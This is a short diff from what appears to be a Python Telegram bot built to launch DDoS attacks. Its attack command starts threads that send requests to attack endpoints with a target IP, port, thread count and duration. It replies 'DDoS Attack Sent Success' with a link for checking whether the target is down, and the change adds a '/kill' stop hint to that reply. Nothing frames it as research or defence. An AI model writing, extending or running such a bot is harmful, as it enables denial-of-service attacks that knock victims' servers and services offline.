@@ -34,7 +34,7 @@ def attack(update, context):
         threading.Thread(target=send_request, args=(f"http://{url}/?ip={ip}&port={port}&thread=20&time={time}",)).start()
 
     print(f"Attack {ip}:{port} in {time} second")
-    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤IP: {ip}\n  ┣➤Port: {port}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-ping?host={ip}")
+    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤IP: {ip}\n  ┣➤Port: {port}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-ping?host={ip}\n⛔️Click To Stop Attack: /kill")
 def main():
     updater = Updater("TOKEN_BOT_TELEGRAM", use_context=True)
     dp = updater.dispatcher
